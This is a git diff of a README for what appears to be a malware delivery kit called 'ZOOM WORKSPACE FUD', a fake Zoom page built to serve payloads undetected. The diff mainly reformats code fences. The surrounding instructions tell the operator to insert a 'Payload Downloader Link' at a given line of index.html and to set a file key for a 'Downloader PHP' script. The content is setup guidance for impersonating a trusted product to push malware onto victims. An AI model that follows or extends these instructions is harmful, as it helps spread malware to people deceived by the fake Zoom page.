@@ -40,13 +40,15 @@ Welcome to the **ZOOM WORKSPACE FUD** repo! This project allows you to easily se
    - Open `index.html` in your repo.
    - Go to **Line 1407** and replace the existing link with your **Payload Downloader Link**.
      - Example:
-       ```domain.com/download.php
+       ```
+       domain.com/download.php
        ```
 
 2. **Edit the File Key**:
    - Find **Line 1405** in `index.html` and update it with the file key from your **Downloader PHP** script.
      - Example:
-       ```const fileKey = "file1"; - downloads file1 in Downloader config.php
+       ```
+       const fileKey = "file1"; - downloads file1 in Downloader config.php
        ```
 
 ---
